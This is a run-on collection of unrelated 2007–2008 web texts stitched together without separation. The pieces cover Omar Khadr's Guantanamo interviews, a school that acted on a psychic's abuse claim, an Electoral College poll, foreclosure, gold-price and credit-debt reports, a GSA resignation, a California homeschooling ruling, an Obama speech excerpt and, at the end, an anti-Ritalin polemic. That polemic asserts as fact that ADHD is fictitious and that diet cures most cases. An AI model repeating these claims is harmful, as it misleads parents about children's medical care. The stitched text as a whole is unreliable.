The idea is to keep prisoners from resting , making them more susceptible to interrogation .
A Foreign Affairs document states that Mr. Khadr was placed in the program prior to a set of interviews and âwill soon be placed in isolation for up to three weeks and then he will be interviewed again .â 
The effectiveness of the method was questionable in the eyes of the Canadians .
" Certainly Umar did not appear to have been affected by three weeks on the ' frequent flyer ' program .
He did not yawn or indicate in any way that he was tired throughout the two - hour interview .
It seems likely that the natural resilience of a well - fed and healthy 17 - year - old are keeping him going . "
During the first Canadian visit , in February of 2003 , Mr. Khadr recanted certain admissions claiming " all the information provided in his previous interviews was said only due to ' torture . ' "
During that same visit , Canadians agents questioned Mr. Khadr about his family .
The cameras caught the teenager complaining about his wounds , his eyes and a shoulder , and dabbing âat a small spot on his shoulder that was seeping blood .â 
Foreign Affairs kept records of the visits under intelligence files marked " UBL " or " Bin Laden . "
The Khadr family once lived with the al - Qaeda leader in Afghanistan .
A forensic psychologist told DFAIT that Mr. Khadr was " a Mama 's little boy . "
Considering him a " thoroughly screwed up young man . " officials remarked on several odd behaviours , including one after an interview with a Pentagon interrogator .
" He was shown a picture of his family - he denied knowing anyone in the picture .
Left alone ... he urinated on the picture , " - twice , and despite being shackled .
When left alone , the documents say , he " laid his head down on the table beside the picture in what was seen as an affectionate manner . "
The judge ordering the release of the tapes said that Canada had become implicated in violating international law when the Foreign Affairs office took part in Khadr 's interviews .
The Globe and Mail also reported that the interviews were not being released to benefit the U.S. 's case against Khadr : " In one of the few observations that augurs to the benefit of the federal government , Judge Mosley said that Canadian interrogators apparently were not acting with the purpose of helping U.S. authorities assemble a case against Mr. Khadr .
A Supreme Court ruling last winter had already favoured Mr. Khadr 's right to view material that could aid his defence against U.S. military charges that he still faces of murdering a U.S. soldier in Afghanistan . "
In June of this year , another Canadian news outlet , CBC News released reports from Guards at Guanatanamo Bay with favorable impressions - as well as concerns - regarding Omar Khadr , who is now 21 years old : " Omar Khadr is " salvageable " and a " good kid , " but a prolonged detention at Guantanamo Bay could turn the Canadian into a radical , say the U.S. soldiers who guard him .
His guards describe him as a " likable , funny and intelligent young man , " according to documents from Foreign Affairs , which also state the 21 - year - old hopes Canada will get him out of the U.S. - run detention centre in Cuba . "
Canadian Prime Minister Stephen Harper in a statement while attending the G8 Summit said that he would not seek the return of Khadr to Canada claiming that there was " no real alternative " to the U.S. legal processes in place for Khadr at Guantanamo .
However , the Canadian Press disputes Harper 's claims of no alternative in a report issued shortly after Harper 's statements .
Psychic mediums on television can be fun to watch , but everyone knows , just like the cold readings of parlor tricks , fortune tellers and magician acts , that the psychics do n’t really have psychic powers .
Right ?
A psychic reading is fun ... until it is believed by school officials to be real and used against you .
Can you imagine having child protective services called by school officials , and having your family investigated for sexually abusing your handicapped child , based on a psychic medium ’s cold reading to a teacher ’s aid ?
This story is so incredible , here are several sources confirming this report :
The Mother , The Child , The School Board And The Psychic
... Leduc 's weird tale began on May 30 , when she dropped young Victoria off for class at Terry Fox Elementary and headed in to work , only to receive a frantic phone call from the school telling her it was urgent she come back right away .
The frightened mother rushed back to the campus and was stunned by what she heard — the principal , vice - principal and her daughter 's teacher were all waiting for her in the office , telling her they 'd received allegations that Victoria had been the victim of sexual abuse — and that the CAS had been notified .
How did they come by such startling knowledge ?
... The educational assistant who works with Victoria went to see a psychic last night , and the psychic asked the educational assistant at that particular time if she works with a little girl by the name of " V . "
And she said 'yes , I do . '
And she said , ' well , you need to know that that child is being sexually abused by a man between the ages of 23 and 26 .'" ...
But things got worse when school officials used the " evidence " and accepted the completely unsubstantiated word of the seer by reporting the case to Children 's Aid , which promptly opened a file on the family .
" They reported me to Children 's Aid , " Leduc declares , still disbelieving .
" Based on a psychic ! "
This mother was more fortunate than most accused people might have been .
She had proof because she ’d equipped her daughter with a recording GPS unit for her safety because the school had apparently lost her in the past , according to the news report :
The mother was long dissatisfied with the treatment her daughter had received at the school , after they had allegedly lost her on several occasions .
As a result , the already cash strapped mom had spent a considerable sum of money to not only have her child equipped with a GPS unit , but one that provided audio records of everything that was going on around her .
So she had non -stop taped proof that nothing untoward had ever happened to her daughter ...
And so a case worker came to the Leduc home to discuss the allegations of sexual misconduct , only to admit there was n't a shred of evidence that anything had ever happened at all .
They labelled Leduc a " diligent " mother doing the best she could for her child under difficult circumstances , closed the file and left , calling the report " ridiculous . "
... Leduc is now more convinced than ever that her daughter is n't safe at the campus and that she needs more intensive therapy .
As a result , she 's refused to send Victoria back to class - or to the educational assistant who allegedly started the entire chain of events in the first place .
As a result of her stress and the need to stay home with her daughter , Leduc is now unable to work , has no place to send her child for the rest of the year , is n't sure where she 'll go when school begins in September ...
Mom wants apology after psychic 's abuse claim
... Colleen Leduc , from Barrie , Ont. , told CTV's Canada AM she was called back to her 11 - year - old autistic daughter 's school and told they had something urgent to tell her .
She said she was told that her daughter Victoria 's teaching assistant had been to a psychic recently .
" And the psychic asked her if she worked with a little girl by the name of ' V ' . "
Leduc alleges that when the assistant said yes , the psychic then told the assistant : " ' Well , you need to know she 's being sexually abused by a man between the ages of 23 and 26 . ' "
... Officials at Terry Fox Elementary School then gave Leduc a list of behaviours exhibited by her daughter , which taken together with the report from the psychic , formed a theory of abuse .
" You have to keep in mind she has autism , and she 's in pre-pubescence so she 's developing , and she has no inhibitions , " Leduc says , " so she 's exhibiting behaviours that may be construed as sexual in nature in a social environment . "
Mom says school board ' unprofessional ' to allege abuse based on psychic 's perception
The mother of an autistic girl says the public school board in this city north of Toronto was " completely unprofessional " to formulate a theory that her daughter was being sexually abused based on a psychic ...
Leduc immediately pulled her 11 - year - old daughter , Victoria Nolet , out of Terry Fox Elementary School .
" I have trust issues now , " Leduc said .
" What are they going to concoct next week ? "
... a school board superintendent whose portfolio includes special education , said the school was just following protocol , adding the board is bound by the same legislation -- Child and Family Services Act -- as the CAS when it comes to suspected neglect or sexual abuse ...
The CAS said the legislation stipulates that all cases of suspected abuse be reported " if there are reasonable grounds . "
... But Leduc said information gleaned from a psychic should n't be the impetus for the board to launch a CAS investigation .
" First of all , what were they doing taking a psychic 's word ?...
The board stands by its decision , despite where the initial information came from .
Psychic Information Began Child Abuse Investigation
A Canadian mother was recently subjected to a child abuse investigation on the grounds that a psychic informed a school district employee that a child was being abused ...
Considering that a child abuse allegation can follow someone around for life even if they are vindicated , this is a particularly deplorable act .
This is the twenty - first century !
It should be a matter of shame and social stigma that somebody believes in psychic abilities and trusts a psychic enough to act on the “ information ” provided .
The fact that some con artist ’s word led to an investigation that might have separated a mother from her daughter is simply disgusting .
How'd they do that ?
Psychics on TV can seem so convincingly real that it you might be curious how they do that ?
The staff at Straight Dope wrote a great and in - depth explanation in a 2003 article .
They started off by reminding readers that there is no scientific evidence that psychics really exist :
How come TV psychics seem so convincing ?
... " He told us things he could n't possibly have known . "
Psychics and their fans say it 's evidence of genuine psychic ability .
But keep a couple things in mind :
(1) To date there 's no scientific proof of the existence of " real " psychics .
A stage or TV performance or a personal reading does n't prove anything .
Yes , a psychic can come up with amazingly accurate " hits . "
But people who are NOT psychics and make no pretense of having psychic powers can do readings and get equally good results .
As an example , Ian Rowland ( whom we consulted for this report ) is an entertainer who claims no psychic ability .
He has given TV demonstrations posing as a tarot reader , an astrologer , a clairvoyant , and a spirit medium ( someone who talks to the dead . )
He scored just as many hits as the " genuine " psychics even though he openly admits he is n't psychic .
He got his impressive results using a technique called cold reading .
More on this later .
(2) Demonstrations of psychic ability are n't considered evidence unless they 're done under scientifically - controlled conditions – which is a fancy way of saying no fudging , trickery , or cheating is permitted ...
All that research and effort has failed to produce a single psychic who can demonstrate genuine psychic ability .
So how do entertainers , carnival fortune tellers , tarot readers , and others get those amazing results ?...
They rely on three main techniques :
( a) Hot readings , where the psychic has secretly obtained advance information about the person being read .
( b) Cold readings , where the psychic has no advance information , but instead shrewdly elicits facts during the reading and plays them back to the subject , to the latter 's amazement .
This is the most common technique used by entertainers , and we 'll spend the most time on it .
( c ) TV editing .
OK , let 's dig in ....
[ The full article is here . ]
Amaze your friends !
Despite the claims and near magical abilities of psychics that we think we ’ve seen with our own eyes , “ there has ever been a successful demonstration of these powers in a laboratory , under properly controlled conditions , ” said Dr. Ray Hyman , Professor Emeritus of Psychology at the University of Oregon in Eugene , Oregon .
The most common technique they use is called cold readings .
You , too , can learn how to do cold readings and amaze your friends with your psychic abilities !
If you want to be a psychic , Dr. Hyman wrote a “ Guide to Cold Readings ” for the Australian Skeptics .
He began his 13 key techniques , by writing :
1. Remember that the key ingredient of a successful character reading is confidence .
If you look and act as if you believe in what you are doing , you will be able to sell even a bad reading to most subjects ...
2 . Make creative use of the latest statistical abstracts , polls and surveys ...
The very last trick he insightfully called the Golden Rule .
It ’s the one used by all hucksters trying to sell us something and prey on us , by offering hope and promises : “ Always tell the subject what he / she wants to hear ! ”
People get mad and do n’t like it when you give them the truth ... and , of course , the truth also often leaves nothing to sell . :-)
Psychics , as seen on TV , are not real .
It ’s entertainment .
Televisionland is not real , no matter how convincing it might seem .
It ’s ‘ comforting ’ to know that education professionals teaching our children do n’t know this stuff , is n’t it ?
Poll
Should we eliminate the Electoral College and count only popular votes ?
In 2000 , Al Gore got half a million votes more than George W. Bush , a wider popular vote margin than John F. Kennedy had to best Richard Nixon -- but with Florida , Bush won the Electoral College , 271- 266 because the Supreme Court refused to let a recount continue with fewer than 500 votes difference .
To amend the Constitution , the House and Senate must both pass the amendment by two - thirds votes , then three - fourths of the states must approve .
The machinery of the Constitution is precisely calibrated to discourage changes .
In 1969 , the House overwhelmingly voted to end the Electoral College system .
Both Johnson and Nixon supported the move ; only 70 lawmakers voted no .
But the measure was filibustered to death in the Senate .
Individual states can ammend their constitutions and the election process much easier , effectivly eliminating the negative effects of the electoral college buy relying on the popular vote .
This is being worked on now by http://www.nationalpopularvote.com
Should we elect based only on the actual popular votes cast in elections or continue with the present system ?
Eliminate Electoral College .
Count popular votes
Leave system as it is

NEW YORK ( CNNMoney.com ) --
Foreclosure filings jumped 57 % in March compared with the same month last year and rose 5 % versus February , as the nation 's housing market continues to deteriorate .
RealtyTrac , an online marketer of foreclosure properties , said Tuesday that 234,685 homes were hit with foreclosure filings last month , which include default notices , auction sale notices and bank repossessions .
Of those , 51,393 homes were lost to foreclosure - a 10 % increase over the number of homes lost in February .
" What this report shows us is that the housing market correction is ongoing and we should n't expect the subprime problem to vanish anytime soon , " said Jared Bernstein , a senior economist with the Economic Policy Institute .
On a year over year basis , the number of homes repossessed by banks are up 129 % .
By contrast , the number of foreclosed going up for auction increased a comparatively low 32 % since March 2007 .
A growing trend
That discrepancy suggests that more troubled borrowers are simply walking away from their homes after defaulting , according to RealtyTrac CEO James Saccacio .
After a home goes into foreclosure it goes up for public auction ; if the home does n't sell , the title goes to the bank .
But when a home owner walks away the title goes straight to the bank , which then tries to sell the house on the open market where it can command a higher price , rather than at auction .
" When people have nothing left in the home , they get a foreclosure notice and they 're gone , " said Rick Sharga , a Realty Trac spokesman .
Nevada had the highest foreclosure rate of any state in March , marking the 15th consecutive month that it's has topped the list .
One out of every 139 Nevada households received a foreclosure filing last month , which is nearly 4 times the national average , and an increase of 62 % versus March 2007 .
The foreclosure rate in California was the second highest in the nation , with one in every 204 homes receiving a foreclosure filing in March .
Foreclosure filings were reported on 64,711 California properties in March , up 21 % from the previous month and up almost 106 % from March 2007 .
Home prices still falling
Florida was third on the list , with one in every 282 households being hit with a foreclosure filing last month .
That 's a decrease of nearly 7 % from February , but an increase of nearly 112 % from last year .
All three states saw dramatic increases in home prices during the housing boom as speculative buyers flooded the market .
But home prices in these so - called " Sun Belt " states have fallen dramatically since the housing market collapsed last summer .
SAN FRANCISCO ( MarketWatch ) --
Gold futures tallied a three - session win of nearly $ 27 an ounce Tuesday , boosted by oil 's surge to a record high above $ 122 a barrel and further weakness in the U.S. dollar .
Gold for June delivery closed at $ 877.70 an ounce on the New York Mercantile Exchange , up $ 3.60 for the session .
The contract has now climbed $ 26.80 from Thursday 's closing level of $ 850.90 .
" Gold has corrected the oversold condition that developed last week , " said Ned Schmidt , editor of the Value View Gold Report .
" Speculation in the paper oil market seems to be dominating all . "
“ ' An overdue correction in paper oil could give us a lower gold price , and a great chance to buy . ' ” — Ned Schmidt , Value View Gold Report
Crude - oil futures gained for a third day , touching a new record above $ 122 a barrel , as weakness in the U.S. dollar and global supply concerns continued to boost oil prices .
See Futures Movers .
But Schmidt said in emailed comments that " with no apparent real shortages of oil around the globe , paper oil prices may be at great risk . "
And " an overdue correction in paper oil could give us a lower gold price , and a great chance to buy , " he said .
Over in the currency markets Tuesday , the U.S. dollar traded lower against most of its major rivals .
The dollar index , which measures the greenback against a basket of six major currencies , was at 73.007 Tuesday , down from 73.190 in late North American trading Monday .
See Currencies .
Dollar weakness tends to benefit dollar - denominated commodities , such as gold and crude oil , because it makes them cheaper for holders of other currencies .
" Seasonally strong physical demand should continue to provide a good base for gold in the coming sessions , and with oil prices setting fresh records , investors may look to increase their gold holdings as a hedge against inflation , " said James Moore , an analyst at TheBullionDesk.com , in a research note .
Also on the Nymex , July silver rose 3 cents to close at $ 16.86 an ounce , and July platinum gained $ 42.40 , or 2.2 % , to end at $ 1,969.80 an ounce .
June palladium rose $ 6.95 to close at $ 431.40 an ounce .
July copper futures fell by 7 cents to end at $ 3.88 a pound after climbing more than 3 % in the previous session .
On the equities side , the Amex Gold Bugs Index HUI , gained 1.3 % to close at 413.78 points .
SOURCE : istockphoto Financially stressed Americans are turning to credit cards in greater numbers , according to the most recent economic data .
Amid the worsening U.S. housing crisis , lenders are tightening their mortgage standards , leaving only the most creditworthy borrowers able to take out new mortgages and tap new home equity lines of credit .
That means more and more Americans are racking up record levels of credit card debt to make ends meet — tapping expensive and potentially explosive debt that lenders continue to offer .
Financially stressed Americans are turning to credit cards in greater numbers , according to the most recent economic data .
Data released last week by the Federal Reserve shows that Americans ’ total credit card debt has reached $ 951.7 billion — up 8.2 percent from a year ago and the highest amount ever recorded .
This is not good news amid an economic downturn given the already brisk accumulation of credit card debt by consumers over the past six years .
As detailed in the recent Center for American Progress report “ House of Cards , ” between April 2006 and December 2007 , inflation - adjusted credit card debt accelerated at a rate four times faster than between March 2001 , when the last business cycle ended , and April 2006 .
This increase compensated for a substantial part of the slowdown in mortgages .
This increase in debt is no surprise .
With the costs of almost all basic expenses on the rise , everyday Americans are pushed against a wall .
Gasoline prices , for example , have risen a whopping 26.1 percent from March 2007 to March 2008 .
And since 2001 , the costs of food , utilities , medical care , and college tuition have all skyrocketed .
During the housing boom , Americans who owned their homes could cope with these rapid increases in the cost of living by cashing in on rising home prices .
But as the subprime crisis slowly unfolded over the past year , lenders have tightened mortgage standards .
A survey by the Federal Reserve Board showed that lenders tightened standards in 2007 more than at any point since 1991 .
Yet credit cards continue to be pushed by lenders .
Some estimate that over 6 billion mailings are sent by credit card issuers to U.S. households every year .
Because credit cards have higher borrowing costs than other forms of debt due in part to high fees , many borrowers fall deep into debt .
Already the share of credit card debt that is written off by banks has risen sharply .
As uncovered in “ House of Cards , ” between March 2006 and September 2007 , the share of credit card debt that was charged off by credit card lenders rose from 3.0 percent to 4.0 percent .
Increased defaults could unravel the billions of dollars of securitized debt backed by credit card receivables , just as delinquencies in the housing market unraveled the billions of dollars in residential mortgage - backed securities .
Just like mortgage - backed securities , credit card debt is packaged and sold to investors .
An increase in defaults could lead to losses not just for the credit card lenders , but also for pension funds and investors who bought the debt .
A possible unraveling of the U.S. credit card market and its costs to global financial markets could be partially ameliorated with improved transparency for credit cards .
Further , Congress could make it easier for responsible borrowers to avoid fees and surprise rate increases as they come to rely more and more on their plastic .
The Center for American Progress has highlighted several solutions as to how this can happen .

WASHINGTON  Lurita A. Doan has been forced out as head of the General Services Administration , the federal agency that oversees billions of dollars in contracts and manages thousands of government - owned buildings .
In a stormy two - year tenure as the agency ’s administrator , Ms. Doan has been accused of improperly mixing government business with politics and of trying to steer government contracts to her friends .
Democrats in Congress said she violated the Hatch Act , which makes it illegal for government employees to take action that could influence an election .
Ms. Doan ’s resignation as administrator was requested by the White House on Tuesday , and it takes effect immediately , the agency said on Wednesday .
It released a statement in which Ms. Doan said , “ It has been a great privilege to serve our nation and a great president . ”
Much of the criticism of Ms. Doan came after it became known that on Jan. 26 , 2007 , a deputy to Karl Rove , then President Bush ’s chief political adviser , gave a briefing to employees of her agency that identified incumbent Democrats in Congress whom the Republican Party hoped to unseat in 2008 , as well as Republican incumbents who seemed vulnerable to defeat .
Parents who lack teaching credentials cannot educate their children at home , according to a state appellate court ruling that is sending waves of fear through California ’s home schooling families .
Advocates for the families vowed to appeal the decision to the state Supreme Court .
Enforcement until then appears unlikely , but if the ruling stands , home - schooling supporters say California will have the most regressive law in the nation .
“ This decision is a direct hit against every home schooler in California , ” said Brad Dacus , president of the Pacific Justice Institute , which represents the Sunland Christian School , which specializes in religious home schooling .
“ If the state Supreme Court does not reverse this . . . there will be nothing to prevent home - school witch hunts from being implemented in every corner of the state of California . ”
The institute estimates there are as many as 166,000 California students who are home schooled .
State Department of Education officials say there is no way to know the true number .
Unlike at least 30 other states , home schooling is not specifically addressed in California law .
Under the state education code , students must be enrolled in a public or private school , or can be taught at home by a credentialed tutor .
The California Department of Education currently allows home schooling as long as parents file paperwork with the state establishing themselves as small private schools , hire credentialed tutors or enroll their children in independent study programs run by charter or private schools or public school districts while still teaching at home .
California does little to enforce those provisions and insists it is the local school districts ’ responsibility .
In addition , state education officials say some parents home school their children without the knowledge of any entity .
Home schoolers and government officials have largely accepted this murky arrangement .
“ This works so well , I do n’t see any reason to change it , ” said J. Michael Smith , president of the Virginia - based Home School Legal Defense Assn .
The appellate court ruling stems from a case involving Lynwood parents Phillip and Mary Long , who were repeatedly referred to the Los Angeles County Department of Children and Family Services over various allegations , including claims of physical abuse , involving some of their eight children .
All of the children are currently or had been enrolled in Sunland Christian School , where they would occasionally take tests , but were educated in their home by their mother , Phillip Long said .
A lawyer appointed to represent two of the Long ’s young children requested that the court require them to physically attend a public or private school where adults could monitor their well - being .
A trial court disagreed , but the children ’s lawyer appealed to the 2nd District Court of Appeal , which has jurisdiction over Los Angeles , Ventura , Santa Barbara and San Luis Obispo counties .
The appellate panel ruled that Sunland officials ’ occasional monitoring of the Longs ’ home schooling -- with the children taking some tests at the school -- is insufficient to qualify as being enrolled in a private school .
Since Mary
Long does not have a teaching credential , the family is violating state laws , the ruling said .
“ Parents do not have a constitutional right to home school their children , ” wrote Justice H. Walter Croskey in a Feb. 28 opinion signed by the two other members of the district court .
“ Parents who fail to [ comply with school enrollment laws ] may be subject to a criminal complaint against them , found guilty of an infraction , and subject to imposition of fines or an order to complete a parent education and counseling program . ”
Phillip Long said he believes the ruling stems from hostility against Christians and vowed to appeal to the state Supreme Court .
“ I have sincerely held religious beliefs , ” he said .
“ Public schools conflict with that .
I have to go with what my conscience requires me . ”
Public schools teach such topics as evolution , which Long said he does n’t believe in .
He said his wife spends six hours each day teaching their children reading , writing , math , science , health , physical education , Bible and social studies .
Court papers say Mary Long ’s education ended at 11th grade .
It ’s unclear if the ruling will be enforced , given the likely appeals .
Typically , these rulings take effect 30 days after they are issued .
Other organizations that plan to get involved include the Pacific Justice Institute , Home School Legal Defense Assn. and the Home School Assn. of California .
Meanwhile , state Department of Education ’s attorneys are reviewing the ruling .
Teachers union officials will also be closely monitoring the appeal .
A.J. Duffy , president of United Teachers Los Angeles , said he agrees with the ruling .
“ What ’s best for a child is to be taught by a credentialed teacher , ” he said .
While many educators and officials remained unfamiliar with the ruling Tuesday , news about it has been sweeping websites and blogs devoted to home schooling .
Organizations have been getting tense phone calls from parents worried that they will be targeted .
Families who home school includethose whose religious beliefs conflict with public schools and those whose children are in the entertainment industry or have other time - consuming activities that require them to study at an individualized pace .
Glenn and Kathleen , a Sacramento - area couple who requested that their last name not be used for fear of prosecution , home school their 9 - year - old son Hunter because their Christian beliefs would be contradicted in a public school setting , Glenn said .
He is troubled by the idea that his son would be exposed to teachings about evolution , homosexuality , same - sex marriage and sex education .
“ I want to have control over what goes in my son ’s head , not what ’s put in there by people who might be on the far left who have their own ideas about indoctrinating kids , ” he said .
If the ruling takes effect , Glenn vowed to move his family out of state .
“ If I ca n’t home school my son in California , we ’re going to have to end up leaving California .
That ’s how important it is to me . ”

Senator McCain said – just months ago – that “ Afghanistan is not in trouble because of our diversion to Iraq . ” I could not disagree more .
Our troops and our NATO allies are performing heroically in Afghanistan , but I have argued for years that we lack the resources to finish the job because of our commitment to Iraq .
That ’s what the Chairman of the Joint Chiefs of Staff said earlier this month .
And that ’s why , as President , I will make the fight against al Qaeda and the Taliban the top priority that it should be .
This is a war that we have to win .
I will send at least two additional combat brigades to Afghanistan , and use this commitment to seek greater contributions – with fewer restrictions – from NATO allies .
I will focus on training Afghan security forces and supporting an Afghan judiciary , with more resources and incentives for American officers who perform these missions .
Just as we succeeded in the Cold War by supporting allies who could sustain their own security , we must realize that the 21st century ’s frontlines are not only on the field of battle – they are found in the training exercise near Kabul , in the police station in Kandahar , and in the rule of law in Herat .
Moreover , lasting security will only come if we heed Marshall ’s lesson , and help Afghans grow their economy from the bottom up .
That ’s why I ’ve proposed an additional $ 1 billion in non-military assistance each year , with meaningful safeguards to prevent corruption and to make sure investments are made – not just in Kabul – but out in Afghanistan ’s provinces .
As a part of this program , we ’ll invest in alternative livelihoods to poppy - growing for Afghan farmers , just as we crack down on heroin trafficking .
We cannot lose Afghanistan to a future of narco - terrorism .
The Afghan people must know that our commitment to their future is enduring , because the security of Afghanistan and the United States is shared .
The greatest threat to that security lies in the tribal regions of Pakistan , where terrorists train and insurgents strike into Afghanistan .
We cannot tolerate a terrorist sanctuary , and as President , I wo n’t .
We need a stronger and sustained partnership between Afghanistan , Pakistan and NATO to secure the border , to take out terrorist camps , and to crack down on cross - border insurgents .
We need more troops , more helicopters , more satellites , more Predator drones in the Afghan border region .
And we must make it clear that if Pakistan cannot or will not act , we will take out high - level terrorist targets like bin Laden if we have them in our sights .
Make no mistake : we ca n’t succeed in Afghanistan or secure our homeland unless we change our Pakistan policy .
We must expect more of the Pakistani government , but we must offer more than a blank check to a General who has lost the confidence of his people .
It ’s time to strengthen stability by standing up for the aspirations of the Pakistani people .
That ’s why I ’m cosponsoring a bill with Joe Biden and Richard Lugar to triple non-military aid to the Pakistani people and to sustain it for a decade , while ensuring that the military assistance we do provide is used to take the fight to the Taliban and al Qaeda .
We must move beyond a purely military alliance built on convenience , or face mounting popular opposition in a nuclear - armed nation at the nexus of terror and radical Islam .
Only a strong Pakistani democracy can help us move toward my third goal – securing all nuclear weapons and materials from terrorists and rogue states .
One of the terrible ironies of the Iraq War is that President Bush used the threat of nuclear terrorism to invade a country that had no active nuclear program .
But the fact that the President misled us into a misguided war does n’t diminish the threat of a terrorist with a weapon of mass destruction – in fact , it has only increased it .
In those years after World War II , we worried about the deadly atom falling into the hands of the Kremlin .
Now , we worry about 50 tons of highly enriched uranium – some of it poorly secured – at civilian nuclear facilities in over forty countries .
Now , we worry about the breakdown of a non-proliferation framework that was designed for the bipolar world of the Cold War .
Now , we worry – most of all – about a rogue state or nuclear scientist transferring the world ’s deadliest weapons to the world ’s most dangerous people : terrorists who wo n’t think twice about killing themselves and hundreds of thousands in Tel Aviv or Moscow , in London or New York .

Turning schoolchildren into street junkies
Does Ritalin cause permanent health damage ?
Treating children like guinea pigs
The chemical abuse of children
Ritalin / Adderall addicts snort the meds like cocaine

This cartoon is about Ritalin and Adderall , the two most popular amphetamine stimulant drugs used to " treat " ADHD in children .
It attempts to demonstrate the double standard in American 's drug policy towards children by showing how corporate - sponsored drugs are openly and widely prescribed to children as medicine , while home - made drugs are classified as dangerous substances that will land you in prison ( even if two drugs are chemically identical ! ) .
New research published in the August , 2007 issue of the Journal of the American Academy of Child and Adolescent Psychiatry finds that Ritalin , the amphetamine drug used to treat a fictitious medical disorder labeled Attention Deficit Hyperactivity Disorder , stunts the growth of children .
After three years on the psychotropic drug , children are one inch shorter and 4.4 pounds lighter than their peers , researchers have documented .
The psychiatric industry , of course , has been trying to play down the growth - stunting effects of Ritalin for at least a decade .
Research conducted over the last several years by psychiatrists working for the National Institutes of Health initially found evidence of the drug stunting growth of children , yet nevertheless concluded that Ritalin carries " no long - term growth risk " to children .
( Those researchers , by the way , failed to disclose their financial conflicts of interest with drug companies . )
Because of that conclusion , psychiatrists have refrained from warning parents about the fact that Ritalin stunts the growth of their children , focusing instead of how their children need " treatment " to correct a " brain chemistry disorder " that was , in reality , invented by the Big Pharma - backed psychiatric industry as a way to sell more drugs to children who do n't need them .
Ritalin is an amphetamine .
In street lingo , it 's called " speed . "
Selling speed to children is a felony , but feeding speed to children with a prescription is called " treatment . "
The practice of dosing children with powerful , mind - altering drugs is , in fact , a form of chemical abuse , yet it is tolerated today because it is framed in the language of medicine .
Parents and teachers all too easily agree to the mass drugging of schoolchildren because it makes symptoms of ADHD seemingly go away .
This drugging practice is , ultimately , pursued for the convenience of the children 's caretakers and the profits of powerful drug companies , not out of any real concern for the health of the children .
Nutritional research has shown that the symptoms of ADHD can be completely reversed in 80 percent of children in just two weeks by eliminating processed foods and chemical food additives from their diets .
The so - called " disease " of ADHD is really just an expression of behavior caused by extreme dietary imbalances .
The entire theory of ADHD can also be completely shot down by simply handing an ADHD child an X - Box or Wii gaming system , after which the child will sit down and engage in extremely focused , attentive and mentally demanding gaming activities for as long as six hours without a single break , and without distraction .
If there really were such as disease as Attention Deficit Hyperactivity Disorder , such behavior would not be possible .
The truth is that ADHD kids are n't diseased at all : Most schools are simply boring beyond belief , and children do n't learn well by being forced to sit still at their desks and listen to teachers ramble their way through meaningless memorization exercises dubbed " history " or " science " or whatever the topic may be .
Children learn by doing things , and all that extra hyperactive energy has a useful function if it 's channeled into experiential learning exercises .
This new research about Ritalin stunting the growth of children does not answer the question of whether children ever regain their normal height and body weight , or whether Ritalin causes a permanent stunting of growth that can not be reversed .
It does make us wonder , however , whether a drug that stunts physical growth might also stunt the growth of brain cells and the nervous system , leading to intellectually stunted children at the same time that it produces physically stunted children .
In previous years , psychiatrists tried to argue that it was n't Ritalin that caused the stunting of growth -- it was the ADHD disease itself , they claimed with a straight face !
And thus , treatment with Ritalin was the only way to return children to " normal " growth .
This kind of twisted , circular logic typifies modern psychiatric medicine , which spontaneously invokes the existence of numerous psychiatric " disorders " at the exact coincidental moment that profitable pharmaceuticals become available to treat them .
The logic of psychiatry goes like this : ADHD is a real disease because it's in the DSIM - IV manual ( the bible of fictitious psychiatric disorders ) .
ADHD is listed in the DSIM - IV because it's a real disease according to a group of Big Pharma - funded psychiatrists who made it up .
Thus ,
( See our related cartoon , Disease Mongers , Inc. , to see a humorous depiction of this process . )
Nobody knows the long - term effects of Ritalin use on children .
As a result , the psychiatric industry is treating children like guinea pigs , waiting to see what might happen after someone takes these amphetamines for a decade or longer .
For all we know , Ritalin might stunt the size of the reproductive organs of these children , too , leading to future fertility problems .
Perhaps the " Ritalin generation " wo n't be able to have babies .
This is just a guess , but the important point here is that .
Nobody knows .
Long - term testing has not been done .
It 's all basically a " let 's give these drugs to children and see what happens " experiment .
It 's all quite typical of Big Pharma today , which treats members of the public as revenue - producing guinea pigs who are too stupid to wake up and realize they should be questioning the outrageous claims of treatment now being associated with harmful prescription medications .
These side effects of stunting growth and altering the brain chemistry of children might conceivably be worth it if Ritalin were actually treating a genuine disease .
If Ritalin , for example , were preventing brain cancer in at - risk children , it might be reasonable to trade a reduction of cancer risk with stunted growth .
Butand is , in fact , more a form of chemical mind control than anything resembling real medicine .
To place the growth of children at risk in order to give them a drug so powerful that it would be illegal if sold to children on the street is to engage in medical madness .
There is no justification for the mass - treatment of children today with this drug other than the clever exploitation of human beings for profit .
The only medically proven use of Ritalin , it turns out , would be for parents who want their children to be short and stunted .
Feed those kids enough Ritalin amphetamines , and they wo n't grow up to be as tall or have as much muscle mass as their peers .
It might be a strategy very useful for grooming children for a career as a horse racing jockey , or growing a world - class gymnast ( who are all rather short due to the physics advantage of having a shorter body and limbs ) , but for those parents actually looking to raise healthy children who express their full genetic potential , Ritalin seems to fall short .
( Ahem . )
For those parents looking to ruin the health of their children , on the other hand , dosing kids three times a day with amphetamines seems to be quite useful .
But why stop there ?
Why not graduate to METH amphetamines , too , and start giving your kids street meth like the militaries of the world already give to their soldiers ?
It makes about as much sense as giving them Ritalin , but believe me , if Big Pharma could find a way to control and legalize meth , psychiatrists would no doubt be standing by , ready to invent a fictitious disease " treated " by meth .
( Remember , too , that street meth is manufactured from drug company cold medicines sold over the counter to children . )
It all makes you wonder about the Partnership For a Drug - Free America , does n't it ?
This is an organization funded in part by drug companies , which seems to have no problem whatsoever about the mass drugging of children with Ritalin amphetamines .
The " Partnership , " in my opinion , is n't about making America drug free , it 's about making America addicted to Big Pharma 's drugs while curbing use of the competition : street drugs .
The Partnership says , " Ritalin is a valuable medicine . "
Are they on crack ?
Not surprisingly , when it comes to Ritalin and the drugging of children , it 's all about the profit .
The best way to market a drug is to first market a disorder , then pitch the drug as the only known treatment for that disorder .
In my opinion , what 's happening today in psychiatric medicine isand a form of chemical abuse towards children .
Rather than pretending that these psychiatrists have any real medical authority , we should instead be locking them up and prosecuting them for these Nazi - style chemical assaults upon the population .
Modern psychiatry , through its rampant chemical poisoning of the people , has proven itself to be far more dangerous to the safety of Americans than any terrorist threat , and in any honest society , these people would be stripped of their right to practice " medicine , " and denied access to children .
We need a nationwide restraining order against practitioners of modern psychiatry !
I believe it is time we abolished the industry of psychiatry and its disastrous " treatment " of children with dangerous , mind - altering chemicals .
If we continue to allow these profit - minded psych doctors to drug an entire generation with amphetamines , the long - term consequences to society will no doubt be devastating ..
They simply need honest nutrition , responsible parenting and to be kept away from refined sugars , petrochemical food additives and processed foods .
